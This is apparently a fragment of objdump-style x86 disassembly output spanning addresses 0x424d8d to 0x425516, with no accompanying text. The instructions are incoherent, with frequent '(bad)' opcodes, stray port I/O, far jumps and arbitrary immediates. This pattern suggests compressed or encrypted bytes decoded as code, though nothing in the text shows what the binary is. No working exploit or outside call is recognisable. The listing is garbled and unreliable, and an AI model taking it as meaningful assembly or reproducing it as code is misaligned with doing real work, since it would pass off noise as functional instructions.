  424d8d:	xchg   ecx,esp
  424d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d90:	jmp    0xccee0eac
  424d95:	clc    
  424d96:	fwait
  424d97:	push   esi
  424d98:	inc    edi
  424d99:	int    0x85
  424d9b:	int3   
  424d9c:	(bad)  
  424d9e:	outs   dx,BYTE PTR ds:[esi]
  424d9f:	pop    es
  424da0:	int    0xc2
  424da2:	add    al,0xb7
  424da4:	imul   edi,DWORD PTR [ecx],0x12
  424da7:	pop    ebx
  424da8:	add    bh,BYTE PTR [ebp+0x6c]
  424dab:	adc    DWORD PTR [eax],0xffffffc9
  424dae:	and    eax,0xa2baa155
  424db3:	dec    esp
  424db4:	into   
  424db5:	mov    dh,0xbf
  424db7:	into   
  424db8:	ja     0x424dfa
  424dba:	sbb    dh,BYTE PTR [ebp+0x112f0c58]
  424dc0:	fdiv   DWORD PTR [edx]
  424dc2:	adc    eax,0x5f35d7b2
  424dc7:	sub    eax,DWORD PTR [eax]
  424dc9:	pushf  
  424dca:	push   esp
  424dcb:	mov    DWORD PTR [edx+0x6cdb42d4],eax
  424dd1:	inc    ebp
  424dd2:	pop    edi
  424dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424dd4:	pop    ss
  424dd5:	and    bh,ch
  424dd7:	jns    0x424dbd
  424dd9:	or     al,BYTE PTR [edx+0x28]
  424ddc:	cli    
  424ddd:	out    0xa2,eax
  424ddf:	pop    edi
  424de0:	sub    esp,edx
  424de2:	stc    
  424de3:	imul   edx,DWORD PTR [esi+0x17],0x8f289bae
  424dea:	fwait
  424deb:	add    al,0x91
  424ded:	xchg   BYTE PTR [ebx],bh
  424def:	(bad)  
  424df0:	mov    al,bl
  424df2:	shl    BYTE PTR [eax-0x4b],cl
  424df5:	jmp    0xf3f87fd0
  424dfa:	mov    eax,ds:0xadd1d76c
  424dff:	bound  ebp,QWORD PTR [esi]
  424e01:	rcr    DWORD PTR [edi],1
  424e03:	xchg   DWORD PTR [ecx+0x6d516636],ebx
  424e09:	mov    esp,ds
  424e0b:	dec    ecx
  424e0c:	sub    BYTE PTR [ebx-0x7c],0xdc
  424e10:	mov    esp,0xcc10a661
  424e15:	adc    al,0x69
  424e17:	xchg   ebp,eax
  424e18:	mov    bl,BYTE PTR [ecx]
  424e1a:	jbe    0x424dcb
  424e1c:	and    BYTE PTR [esi-0x3a27ce0b],cl
  424e22:	cli    
  424e23:	jmp    0xc25d128f
  424e28:	jle    0x424e82
  424e2a:	sub    eax,0x81da72cb
  424e2f:	cli    
  424e30:	and    BYTE PTR [ebx],cl
  424e32:	dec    ebp
  424e33:	adc    ch,BYTE PTR [esi]
  424e35:	shl    bl,0x6e
  424e38:	mov    ch,0x9e
  424e3a:	dec    ebx
  424e3b:	int    0x28
  424e3d:	add    eax,0xbe9bed
  424e42:	imul   DWORD PTR [edx+0x4b]
  424e45:	or     ch,bl
  424e47:	xor    esp,ebx
  424e49:	gs push edi
  424e4b:	jge    0x424e22
  424e4d:	call   0x5c13:0xeb9f03db
  424e54:	outs   dx,DWORD PTR ds:[esi]
  424e55:	dec    edi
  424e56:	pop    edi
  424e57:	je     0x424e0f
  424e59:	push   es
  424e5a:	addr16 add eax,0x461c5069
  424e60:	sbb    edi,DWORD PTR [ecx-0x57ef2c89]
  424e66:	pushf  
  424e67:	idiv   BYTE PTR [edx-0x4bededa2]
  424e6d:	pop    ecx
  424e6e:	and    edx,DWORD PTR [edx+0x3f449484]
  424e74:	sub    eax,0xedb718c
  424e79:	inc    esp
  424e7a:	nop
  424e7b:	mov    eax,ds:0x2f859aa6
  424e80:	(bad)  
  424e81:	imul   eax,DWORD PTR [ebx+0x65709de5],0xa5ba3ac2
  424e8b:	jb     0x424e1a
  424e8d:	gs jb  0x424ee9
  424e90:	and    ch,al
  424e92:	out    dx,al
  424e93:	xor    eax,0x2ba8d1f3
  424e98:	xchg   ebp,eax
  424e99:	push   edx
  424e9a:	cmp    eax,0xc60dfa2c
  424e9f:	adc    dh,bh
  424ea1:	popf   
  424ea2:	popa   
  424ea3:	push   edi
  424ea4:	cmc    
  424ea5:	ins    DWORD PTR es:[edi],dx
  424ea6:	mov    cl,0x97
  424ea8:	sub    edx,DWORD PTR [ebx]
  424eaa:	sbb    bh,BYTE PTR [edi+0x3]
  424ead:	add    al,0x5b
  424eaf:	push   eax
  424eb0:	retf   
  424eb1:	fs sti 
  424eb3:	pop    ebx
  424eb4:	cmp    cl,bh
  424eb6:	call   DWORD PTR [edx-0x848b8ba]
  424ebc:	pop    es
  424ebd:	or     al,BYTE PTR [esp+edx*4-0x566d9ffe]
  424ec4:	mov    bl,0x5f
  424ec6:	test   eax,0xde0f8175
  424ecb:	ins    DWORD PTR es:[edi],dx
  424ecc:	pop    ds
  424ecd:	ja     0x424e97
  424ecf:	(bad)  
  424ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ed2:	out    dx,eax
  424ed3:	adc    al,0x1d
  424ed5:	push   eax
  424ed6:	call   DWORD PTR [eax]
  424ed8:	in     al,dx
  424ed9:	loop   0x424f55
  424edb:	adc    bh,BYTE PTR [ebp-0x6d]
  424ede:	aad    0x71
  424ee0:	or     DWORD PTR [edx],ecx
  424ee2:	sbb    BYTE PTR [edi+0xa],bh
  424ee5:	adc    BYTE PTR [ebp-0x48],dh
  424ee8:	push   0xffffffb1
  424eea:	mov    ?,WORD PTR [esi]
  424eec:	mov    cl,BYTE PTR [edx+0x1d7352e5]
  424ef2:	loop   0x424eff
  424ef4:	xchg   ecx,eax
  424ef5:	dec    edi
  424ef6:	aad    0x36
  424ef8:	or     ecx,DWORD PTR [eax+0x5d413282]
  424efe:	sti    
  424eff:	sub    al,0x1d
  424f01:	mov    dh,0x2f
  424f03:	bound  esi,QWORD PTR ds:0x3e37c61a
  424f09:	mov    ?,esp
  424f0b:	and    ecx,ecx
  424f0d:	das    
  424f0e:	out    dx,eax
  424f0f:	dec    eax
  424f10:	sub    ebp,DWORD PTR [ebp-0x3c]
  424f13:	fadd   QWORD PTR [esi+0x647e2417]
  424f19:	cs scas eax,DWORD PTR es:[edi]
  424f1b:	or     eax,0x7fd97e0c
  424f20:	mov    eax,DWORD PTR [ebp-0x6b]
  424f23:	cli    
  424f24:	lahf   
  424f25:	arpl   cx,dx
  424f27:	fwait
  424f28:	xchg   ebp,eax
  424f29:	test   BYTE PTR [esi*1+0xda8a5a],0x2a
  424f31:	enter  0x3a6e,0x84
  424f35:	xchg   esi,eax
  424f36:	xor    edx,DWORD PTR [ebx+0x3ac7c98b]
  424f3c:	out    dx,eax
  424f3d:	scas   al,BYTE PTR es:[edi]
  424f3e:	xchg   edi,eax
  424f3f:	mov    edx,0xe19c4a0b
  424f44:	pop    eax
  424f45:	arpl   WORD PTR [eax+0x64],dx
  424f48:	and    ah,0xe7
  424f4b:	adc    DWORD PTR [ebx],ebp
  424f4d:	fdiv   QWORD PTR [edx]
  424f4f:	mov    dh,0x6
  424f51:	nop
  424f52:	mov    ecx,0x60ec1fca
  424f57:	add    ecx,DWORD PTR [esi-0x7154f6db]
  424f5d:	sbb    al,0xbb
  424f5f:	punpckhwd mm0,QWORD PTR [esi]
  424f62:	or     DWORD PTR [ebx+edi*4+0x4edd4574],esp
  424f69:	cmp    al,0x45
  424f6b:	xlat   BYTE PTR ds:[ebx]
  424f6c:	sub    ebp,ebx
  424f6e:	adc    BYTE PTR [esi-0x13],al
  424f71:	jle    0x424f36
  424f73:	inc    esp
  424f74:	fnsave [ebx-0x79f46757]
  424f7a:	rcl    dh,0xfb
  424f7d:	adc    al,BYTE PTR [edi+0x715bb064]
  424f83:	and    DWORD PTR [ebx+0x27],ebp
  424f86:	lods   al,BYTE PTR ds:[esi]
  424f87:	mov    edx,0xd7142c05
  424f8c:	and    dh,dh
  424f8e:	or     BYTE PTR [edx+0x22],bl
  424f91:	pop    esp
  424f92:	sbb    eax,0xa4f4622f
  424f97:	sbb    dl,cl
  424f99:	jecxz  0x424fae
  424f9b:	push   0x584c2e77
  424fa0:	(bad)  
  424fa1:	xchg   ecx,eax
  424fa2:	pop    ecx
  424fa3:	xor    BYTE PTR [edx-0x7cb97518],bh
  424fa9:	cmp    eax,0x6b677da6
  424fae:	js     0x424fa6
  424fb0:	test   eax,0xd199dfdd
  424fb5:	inc    edx
  424fb6:	sar    ebx,0x92
  424fb9:	jo     0x425007
  424fbb:	jmp    0x5bd8:0x865ff12c
  424fc2:	pop    esi
  424fc3:	jbe    0x424f5c
  424fc5:	(bad)  
  424fc6:	mov    eax,0x2c8ada20
  424fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fcc:	sbb    al,0x5e
  424fce:	jno    0x424fd5
  424fd0:	arpl   WORD PTR [ebx+0x7582e2be],ax
  424fd6:	mov    fs,WORD PTR [esi]
  424fd8:	sbb    DWORD PTR [ecx],edi
  424fda:	add    esp,DWORD PTR [esi+edi*8]
  424fdd:	stc    
  424fde:	dec    esp
  424fdf:	aas    
  424fe0:	pop    ecx
  424fe1:	hlt    
  424fe2:	arpl   WORD PTR [eax-0x26],di
  424fe5:	into   
  424fe6:	sub    eax,0xf7eb2826
  424feb:	cwde   
  424fec:	int3   
  424fed:	ret    0xe10b
  424ff0:	loop   0x425053
  424ff2:	aad    0x7c
  424ff4:	cmp    al,0xf4
  424ff6:	mul    DWORD PTR [edi-0x5e]
  424ff9:	ror    DWORD PTR [ebx+0x72],cl
  424ffc:	neg    BYTE PTR [ecx]
  424ffe:	into   
  424fff:	add    ecx,DWORD PTR [esi-0x17]
  425002:	(bad)  
  425004:	cmp    bl,BYTE PTR [esi+0x13]
  425007:	cld    
  425008:	loop   0x424f96
  42500a:	into   
  42500b:	ds adc al,0x2b
  42500e:	in     eax,0x7d
  425010:	fcomp  QWORD PTR [ecx-0x58ce9904]
  425016:	mov    bh,0x1
  425018:	inc    ecx
  425019:	mov    dh,0xfe
  42501b:	mov    edi,0xb336459a
  425020:	adc    al,0xbd
  425022:	xchg   esp,eax
  425023:	mul    bl
  425025:	inc    edi
  425026:	(bad)  
  425027:	mov    al,ds:0xdaf50a99
  42502c:	inc    ecx
  42502d:	push   edx
  42502e:	mov    ah,0x38
  425030:	cld    
  425031:	repz inc esi
  425033:	dec    edx
  425034:	pop    esi
  425035:	sar    BYTE PTR [ecx],cl
  425037:	(bad)  
  425038:	jmp    0x3b35:0x2818c957
  42503f:	pushf  
  425040:	dec    ebp
  425041:	inc    edx
  425042:	mov    bl,bl
  425044:	mov    ah,0xbb
  425046:	push   ebx
  425047:	mov    DWORD PTR [ebx+esi*4-0x5394b564],eax
  42504e:	lea    ebp,[ebx]
  425050:	int3   
  425051:	inc    ebp
  425052:	jo     0x42505e
  425054:	sub    bl,BYTE PTR [esp+ebp*4]
  425057:	aad    0x4
  425059:	jle    0x4250bf
  42505b:	adc    al,0xf4
  42505d:	out    0xee,al
  42505f:	out    0x58,al
  425061:	in     eax,dx
  425062:	int    0x57
  425064:	shl    ebp,0x3f
  425067:	mov    ds:0xf1807d40,al
  42506c:	xchg   edi,eax
  42506d:	lods   al,BYTE PTR ds:[esi]
  42506e:	in     eax,dx
  42506f:	lock cmp al,0x13
  425072:	pop    ds
  425073:	je     0x425000
  425075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425076:	mov    eax,ds:0x7bf58d2e
  42507b:	clc    
  42507c:	sub    dl,0xad
  42507f:	shl    BYTE PTR [ecx+0x3c2249b3],0x65
  425086:	mov    dl,0x90
  425088:	fild   QWORD PTR [edx-0x68]
  42508b:	xchg   ebp,eax
  42508c:	mov    ah,0x1d
  42508e:	dec    esp
  42508f:	(bad)  [eax-0x51130a03]
  425095:	pop    eax
  425096:	sub    esp,edi
  425098:	stc    
  425099:	mov    eax,0xa5203c0a
  42509e:	(bad)
  4250a1:	cld    
  4250a2:	cs add al,0xd9
  4250a5:	inc    ebp
  4250a6:	add    dl,ch
  4250a8:	or     al,BYTE PTR [esi-0x50]
  4250ab:	pop    esi
  4250ac:	ins    BYTE PTR es:[edi],dx
  4250ad:	pop    eax
  4250ae:	and    al,0x3d
  4250b0:	fwait
  4250b1:	sbb    eax,0xe6f88f22
  4250b6:	mov    DWORD PTR [ebx],ebx
  4250b8:	mov    ebp,0xbf123126
  4250bd:	loopne 0x4250ab
  4250bf:	outs   dx,DWORD PTR ds:[esi]
  4250c0:	std    
  4250c1:	cmp    cl,BYTE PTR ds:0x566da739
  4250c7:	push   cs
  4250c8:	cmp    al,0x0
  4250ca:	sub    al,0x20
  4250cc:	lahf   
  4250cd:	in     al,dx
  4250ce:	jmp    0x425070
  4250d0:	push   esp
  4250d1:	pop    esi
  4250d2:	sbb    ecx,DWORD PTR [ebx+0xc]
  4250d5:	clc    
  4250d6:	xchg   DWORD PTR es:[ecx+0x58],eax
  4250da:	(bad)  
  4250db:	xor    ecx,DWORD PTR [ecx+0x1a650228]
  4250e1:	(bad)  
  4250e2:	jp     0x425143
  4250e4:	or     ch,bh
  4250e6:	and    DWORD PTR [esi+edi*1-0x21a0f5f7],eax
  4250ed:	mov    DWORD PTR [ebx+ebp*1+0x42174a5b],edx
  4250f4:	add    al,0x3c
  4250f6:	aam    0x8d
  4250f8:	ins    DWORD PTR es:[edi],dx
  4250f9:	cwde   
  4250fa:	popa   
  4250fb:	lock stos BYTE PTR es:[edi],al
  4250fd:	bound  edx,QWORD PTR [edi+0x55]
  425100:	(bad)  
  425101:	cli    
  425102:	(bad)  
  425104:	aad    0x15
  425106:	pusha  
  425107:	int    0x8
  425109:	gs jg  0x42517a
  42510c:	adc    BYTE PTR [ebx+0x2b],ch
  42510f:	xlat   BYTE PTR ds:[ebx]
  425110:	into   
  425111:	inc    ebx
  425112:	outs   dx,BYTE PTR ds:[esi]
  425113:	mov    edi,0x71a1326b
  425118:	jecxz  0x425145
  42511a:	and    edx,0x7a
  42511d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42511e:	das    
  42511f:	aam    0xfc
  425121:	jl     0x425120
  425123:	jge    0x42512f
  425125:	shr    BYTE PTR [eax-0x3f0fe3f6],cl
  42512b:	dec    ebp
  42512c:	sahf   
  42512d:	xchg   ebp,eax
  42512e:	xchg   ebp,eax
  42512f:	ins    DWORD PTR es:[edi],dx
  425130:	adc    DWORD PTR [edx-0x4d],eax
  425133:	cld    
  425134:	xchg   ecx,esi
  425136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425137:	jbe    0x425164
  425139:	adc    bh,BYTE PTR [edi-0x157bd44a]
  42513f:	inc    esp
  425140:	sub    dl,BYTE PTR [eax+0x558e0847]
  425146:	adc    ah,bl
  425148:	mov    bl,BYTE PTR [esi]
  42514a:	and    eax,0x29175129
  42514f:	ja     0x425105
  425151:	mov    edi,0x7db7632a
  425156:	jne    0x425130
  425158:	sbb    ecx,DWORD PTR [ebp+0x75]
  42515b:	push   ss
  42515c:	ds xchg esi,eax
  42515e:	sub    al,0xfe
  425160:	lods   eax,DWORD PTR ds:[esi]
  425161:	xor    BYTE PTR [ecx],dh
  425163:	scas   eax,DWORD PTR es:[edi]
  425164:	pop    es
  425165:	mov    ecx,DWORD PTR [esi+0x30d2f7b]
  42516b:	bound  ebp,QWORD PTR [esi-0x6a04e17c]
  425171:	push   cs
  425172:	mov    dh,0xaf
  425174:	arpl   WORD PTR [edi-0x68],dx
  425177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425178:	inc    ebp
  425179:	js     0x425184
  42517b:	xor    BYTE PTR [ebx],bl
  42517d:	push   edx
  42517e:	data16 gs cld 
  425181:	pop    esp
  425182:	ret    0x26e8
  425185:	or     al,0x91
  425187:	ret    0xb807
  42518a:	pusha  
  42518b:	fbld   TBYTE PTR [edx-0x3f]
  42518e:	mov    BYTE PTR [edx],al
  425190:	sbb    BYTE PTR [eax+0x0],ah
  425193:	mov    edi,DWORD PTR [eax-0x30]
  425196:	popf   
  425197:	sbb    ebx,DWORD PTR [ecx]
  425199:	cli    
  42519a:	push   cs
  42519b:	mov    dh,ch
  42519d:	(bad)  
  42519e:	jae    0x425163
  4251a0:	sti    
  4251a1:	loopne 0x42518a
  4251a3:	xor    DWORD PTR [esi+edx*1-0xe],ecx
  4251a7:	fld    DWORD PTR [ecx-0x4502ce05]
  4251ad:	mov    al,ds:0x9ebd4b9
  4251b2:	dec    edx
  4251b3:	cdq    
  4251b4:	imul   ebx,DWORD PTR [edi+0xc],0x57
  4251b8:	stos   BYTE PTR es:[edi],al
  4251b9:	add    al,0xe5
  4251bb:	call   0xda06:0xb8420654
  4251c2:	mov    esp,0xc19e75f2
  4251c7:	push   esp
  4251c8:	pushf  
  4251c9:	icebp  
  4251ca:	mov    WORD PTR [eax-0x6755ed4],ss
  4251d0:	and    DWORD PTR [ebp+edi*2+0x750012f0],esi
  4251d7:	lahf   
  4251d8:	or     cl,bl
  4251da:	shr    dh,0xd3
  4251dd:	mov    dh,0x2a
  4251df:	xchg   ebx,eax
  4251e0:	sub    bl,BYTE PTR [edx]
  4251e2:	mov    dl,BYTE PTR [ebx+0x5e]
  4251e5:	pcmpgtd mm0,QWORD PTR [esi]
  4251e8:	ret    
  4251e9:	(bad)  
  4251ea:	test   al,0x6b
  4251ec:	xchg   ebx,eax
  4251ed:	rcl    BYTE PTR [ebp-0x2],cl
  4251f0:	in     al,dx
  4251f1:	push   edx
  4251f2:	jge    0x4251bb
  4251f4:	(bad)  
  4251f5:	xchg   edi,eax
  4251f6:	inc    ebp
  4251f7:	pop    eax
  4251f8:	push   es
  4251f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251fa:	adc    ebp,DWORD PTR [ebx*2+0x24f39dba]
  425201:	daa    
  425202:	sub    al,0x66
  425204:	std    
  425205:	fcomp  DWORD PTR [edx+edi*2-0x4924fce7]
  42520c:	push   edx
  42520d:	loop   0x425276
  42520f:	je     0x425241
  425211:	lds    edi,FWORD PTR [edi+0x581809a2]
  425217:	jg     0x425228
  425219:	push   esp
  42521a:	outs   dx,DWORD PTR ds:[esi]
  42521b:	lea    esp,ds:0x7e601bfe
  425221:	jle    0x425287
  425223:	test   DWORD PTR [ebx-0x61],eax
  425226:	cwde   
  425227:	and    DWORD PTR [edi-0x22211e2c],ecx
  42522d:	or     ecx,eax
  42522f:	add    ebp,DWORD PTR [edx-0x6699d60f]
  425235:	or     ebx,edi
  425237:	iret   
  425238:	icebp  
  425239:	ins    BYTE PTR es:[edi],dx
  42523a:	sbb    ebp,DWORD PTR [ebp+ebx*2-0x51]
  42523e:	pop    edi
  42523f:	lods   al,BYTE PTR ds:[esi]
  425240:	outs   dx,DWORD PTR ds:[esi]
  425241:	and    edi,edi
  425243:	out    dx,al
  425244:	add    DWORD PTR [esi],edx
  425246:	xor    edi,DWORD PTR [ebx+0x60fc0585]
  42524c:	and    al,0x41
  42524e:	inc    eax
  42524f:	mov    DWORD PTR [edi],esi
  425251:	adc    edx,edi
  425253:	sub    ah,dh
  425255:	mov    ebp,0x2a630a86
  42525a:	mov    dh,0x6d
  42525c:	bound  ecx,QWORD PTR [ecx+ebx*8-0x5d]
  425260:	lds    ebx,FWORD PTR [edx]
  425262:	mov    bh,0x35
  425264:	outs   dx,DWORD PTR ds:[esi]
  425265:	scas   al,BYTE PTR es:[edi]
  425266:	xchg   ecx,eax
  425267:	xchg   ebp,eax
  425268:	das    
  425269:	mov    ch,0xf9
  42526b:	pop    ds
  42526c:	xchg   ecx,eax
  42526d:	mov    cl,0xdf
  42526f:	sbb    esi,eax
  425271:	std    
  425272:	(bad)  
  425273:	adc    eax,0x7879b1ce
  425278:	std    
  425279:	aam    0xf6
  42527b:	pop    ebp
  42527c:	add    esp,DWORD PTR ds:0xcafdb68
  425282:	pop    ebp
  425283:	aad    0xc7
  425285:	inc    ebx
  425286:	test   eax,0x9202534f
  42528b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42528c:	pop    es
  42528d:	not    DWORD PTR [edx-0x4ff35714]
  425293:	(bad)  
  425294:	cmp    edx,esi
  425296:	pop    ebp
  425297:	rcr    DWORD PTR [esi],cl
  425299:	jo     0x425271
  42529b:	test   eax,0x8bae0429
  4252a0:	into   
  4252a1:	fstp   TBYTE PTR [edi+0x2b2af8bc]
  4252a7:	xor    edi,DWORD PTR [ebp+0x6ae0c1dc]
  4252ad:	push   ebx
  4252ae:	cwde   
  4252af:	outs   dx,BYTE PTR ds:[esi]
  4252b0:	ds xchg ecx,eax
  4252b2:	sub    dl,BYTE PTR [ecx]
  4252b4:	push   esi
  4252b5:	aam    0xc8
  4252b7:	not    DWORD PTR [edx+ebp*2-0x32]
  4252bb:	mov    BYTE PTR [ebp-0x35],dh
  4252be:	mov    bh,0xc5
  4252c0:	jns    0x425271
  4252c2:	pop    esp
  4252c3:	inc    edx
  4252c4:	aas    
  4252c5:	mov    ds:0x36894417,al
  4252ca:	dec    eax
  4252cb:	test   eax,0x7853a9e6
  4252d0:	loop   0x4252f5
  4252d2:	or     ecx,DWORD PTR [eax-0x2]
  4252d5:	adc    eax,0x8758f42e
  4252da:	or     BYTE PTR [ebx],0xc6
  4252dd:	lods   eax,DWORD PTR ds:[esi]
  4252de:	mov    edx,0x6227c5a3
  4252e3:	jecxz  0x42532a
  4252e5:	and    eax,0xc17b60c0
  4252ea:	retf   0x8a30
  4252ed:	cmc    
  4252ee:	jne    0x425270
  4252f0:	(bad)  
  4252f1:	(bad)  
  4252f2:	mov    ch,0x7a
  4252f4:	jmp    0x5fec:0x21b85610
  4252fb:	dec    eax
  4252fc:	mov    DWORD PTR ds:0xa5917a0d,edx
  425302:	push   edi
  425303:	scas   al,BYTE PTR es:[edi]
  425304:	push   edi
  425305:	push   edx
  425306:	in     al,0xda
  425308:	xchg   BYTE PTR [edx-0xd],ah
  42530b:	sub    dh,BYTE PTR [esi+0x5]
  42530e:	imul   ebp,DWORD PTR [eax+0x6e],0xc61b8405
  425315:	mov    ebx,0x764dd8cf
  42531a:	mov    edx,0x68d6e987
  42531f:	jl     0x425395
  425321:	pop    esi
  425322:	bound  edi,QWORD PTR [edx]
  425324:	imul   ebx,DWORD PTR [ecx],0x65
  425327:	imul   ecx,DWORD PTR [edx+0x29e1ab0b],0xd240366
  425331:	mov    ebp,0x95e27404
  425336:	test   eax,ecx
  425338:	add    esp,esi
  42533a:	xchg   edx,eax
  42533b:	lds    esp,FWORD PTR [eax+0x2da8d137]
  425341:	xchg   esi,eax
  425342:	mov    dh,0xb
  425344:	dec    esp
  425345:	lods   al,BYTE PTR ds:[esi]
  425346:	xor    BYTE PTR [ebp-0xa],0x1b
  42534a:	push   0xc878358f
  42534f:	pop    edi
  425350:	xlat   BYTE PTR ds:[ebx]
  425351:	dec    ecx
  425352:	or     ah,BYTE PTR ss:[esi+0x23f98282]
  425359:	xchg   esp,eax
  42535a:	retf   0x99fc
  42535d:	xor    BYTE PTR [edi-0x6],al
  425360:	popf   
  425361:	aas    
  425362:	xchg   ebp,eax
  425363:	xor    ecx,DWORD PTR [esi+0x1a]
  425366:	push   0x140d205
  42536b:	xor    bl,al
  42536d:	add    bh,bh
  42536f:	pop    esi
  425370:	adc    DWORD PTR [eax-0x2e],0xd
  425374:	and    al,0x4d
  425376:	sub    DWORD PTR [eax+0x5b],edi
  425379:	jae    0x425354
  42537b:	and    BYTE PTR [eax],0x5
  42537e:	in     al,0x75
  425380:	xor    ch,ch
  425382:	pop    esi
  425383:	jnp    0x42537f
  425385:	sbb    ah,ch
  425387:	mov    DWORD PTR [edx+esi*8],eax
  42538a:	ror    BYTE PTR [edx+0x3ebef964],1
  425390:	nop
  425391:	inc    edi
  425392:	dec    esi
  425393:	or     DWORD PTR [edx-0x6d41fac3],ecx
  425399:	add    ebp,DWORD PTR [edi]
  42539b:	lahf   
  42539c:	xchg   DWORD PTR [ebx-0x7d],ecx
  42539f:	xlat   BYTE PTR ds:[ebx]
  4253a0:	out    0xb,al
  4253a2:	push   0x14833e1c
  4253a7:	sbb    BYTE PTR ds:0x653f0dd3,cl
  4253ad:	pop    edi
  4253ae:	lods   eax,DWORD PTR ds:[esi]
  4253af:	cmp    BYTE PTR [edx-0x78356372],al
  4253b5:	imul   ebp,DWORD PTR [ecx],0xffffffbd
  4253b8:	inc    ebp
  4253b9:	xchg   BYTE PTR [esi*8-0x733c9bfc],bh
  4253c0:	pushf  
  4253c1:	retf   0x2105
  4253c4:	inc    edx
  4253c5:	jp     0x4253d5
  4253c7:	loop   0x425429
  4253c9:	cmc    
  4253ca:	lods   eax,DWORD PTR ds:[esi]
  4253cb:	cmp    DWORD PTR [ebx-0x29ac4866],ecx
  4253d1:	bound  ebp,QWORD PTR [esi]
  4253d3:	jae    0x425374
  4253d5:	inc    esi
  4253d6:	cmp    DWORD PTR [eax],ebp
  4253d8:	cmp    eax,0x813c23d4
  4253dd:	scas   al,BYTE PTR es:[edi]
  4253de:	mov    ecx,0x9d80c594
  4253e3:	or     DWORD PTR [ebx-0x5eb4a9c1],ebp
  4253e9:	sar    dl,1
  4253eb:	test   al,0xbf
  4253ed:	mov    eax,ds:0x408abf9
  4253f2:	xor    al,BYTE PTR [edx-0x2a]
  4253f5:	arpl   WORD PTR [eax+0x3819b301],cx
  4253fb:	push   edx
  4253fc:	xlat   BYTE PTR ds:[ebx]
  4253fd:	shl    BYTE PTR [ebp-0x46],1
  425400:	mov    ?,ecx
  425402:	mul    BYTE PTR [edi-0x54]
  425405:	ret    
  425406:	rcl    bl,cl
  425408:	iret   
  425409:	cmp    eax,0x8d2a7c98
  42540e:	pop    edx
  42540f:	test   al,0xf6
  425412:	add    edx,DWORD PTR [eax-0x61a07030]
  425418:	sub    al,0xab
  42541a:	add    ebp,ebp
  42541c:	cmp    cl,BYTE PTR [ecx]
  42541e:	mov    fs,WORD PTR [edx-0x3c]
  425421:	mov    al,dh
  425423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425424:	cmc    
  425425:	hlt    
  425426:	cmp    DWORD PTR [esi],0x9733bcb1
  42542c:	xlat   BYTE PTR ds:[ebx]
  42542d:	push   ebx
  42542e:	push   edx
  42542f:	popf   
  425430:	dec    edx
  425431:	xor    ebx,DWORD PTR [ebp+eiz*8-0xcb6ca34]
  425438:	mov    DWORD PTR [edi-0x48],edi
  42543b:	fs ret 
  42543d:	(bad)  
  42543e:	dec    ebx
  42543f:	stos   BYTE PTR es:[edi],al
  425440:	mov    fs,WORD PTR [ecx+0x4]
  425443:	inc    edx
  425444:	stos   DWORD PTR es:[edi],eax
  425445:	pop    edi
  425446:	scas   eax,DWORD PTR es:[edi]
  425447:	adc    edx,eax
  425449:	call   0x2156843
  42544e:	xor    esi,ebx
  425450:	jns    0x425448
  425452:	mov    bl,0x37
  425454:	es xchg ecx,eax
  425456:	mov    esp,0xfed15cb7
  42545b:	std    
  42545c:	mov    edi,DWORD PTR [edx-0x7d]
  42545f:	cmp    bh,BYTE PTR [edx-0x1ba05f5f]
  425465:	out    0x15,al
  425467:	ret    
  425468:	retf   0x4009
  42546b:	push   esp
  42546c:	ins    DWORD PTR es:[edi],dx
  42546d:	jbe    0x425460
  42546f:	xor    al,0x14
  425471:	ja     0x42546c
  425473:	into   
  425474:	inc    edx
  425475:	xor    BYTE PTR [edi],al
  425477:	sub    edi,DWORD PTR [eax+ebx*2]
  42547a:	pop    ds
  42547b:	idiv   BYTE PTR [eax-0x2cc6e748]
  425481:	xor    ebp,DWORD PTR [edx+0x6c]
  425484:	ja     0x4254fe
  425486:	stos   BYTE PTR es:[edi],al
  425487:	stos   DWORD PTR es:[edi],eax
  425488:	and    eax,0x8ac1e289
  42548d:	add    DWORD PTR [ecx+0x31],0x13
  425491:	adc    cl,dh
  425493:	fwait
  425494:	js     0x42549c
  425496:	(bad)  
  425497:	gs dec eax
  425499:	jp     0x425424
  42549b:	xor    al,dl
  42549d:	push   cs
  42549e:	mov    ch,0xb2
  4254a0:	xchg   esi,eax
  4254a1:	mov    cs,WORD PTR [ebx]
  4254a3:	mov    esp,0x1d28e628
  4254a8:	add    al,0xd9
  4254aa:	add    eax,0x1fe11a27
  4254af:	mov    WORD PTR [edx-0x402c3ed3],?
  4254b5:	in     al,dx
  4254b6:	test   ah,ah
  4254b8:	sub    eax,ecx
  4254ba:	inc    BYTE PTR [eax+0x65]
  4254bd:	enter  0x5c1b,0x6b
  4254c1:	das    
  4254c2:	sub    BYTE PTR [ecx+0x6f893e6e],dh
  4254c8:	test   al,0x32
  4254ca:	sbb    eax,0x7f04d93f
  4254cf:	lock aad 0xd9
  4254d2:	or     eax,0xf0848c2e
  4254d7:	das    
  4254d8:	in     eax,0x16
  4254da:	iret   
  4254db:	scas   al,BYTE PTR es:[edi]
  4254dc:	outs   dx,BYTE PTR ds:[esi]
  4254dd:	jl     0x425514
  4254df:	sti    
  4254e0:	inc    ebx
  4254e1:	mov    al,ds:0x959911f6
  4254e6:	xor    eax,0x514e088b
  4254eb:	cmp    eax,0xdefd294e
  4254f0:	rcr    DWORD PTR [edi],1
  4254f2:	fwait
  4254f3:	test   eax,0x3380efee
  4254f8:	push   eax
  4254f9:	mov    dl,BYTE PTR [ecx]
  4254fb:	jg     0x4254b8
  4254fd:	loopne 0x425504
  4254ff:	cmp    BYTE PTR [esi+0x5b],dl
  425502:	lock js 0x42550b
  425505:	(bad)  
  425506:	jne    0x42556a
  425508:	push   es
  425509:	add    bh,dl
  42550b:	ja     0x4254e7
  42550d:	dec    ebx
  42550e:	push   es
  42550f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425510:	outs   dx,DWORD PTR ds:[esi]
  425511:	loop   0x4254b5
  425513:	cs jecxz 0x42557d
  425516:	retf   0x6f7a
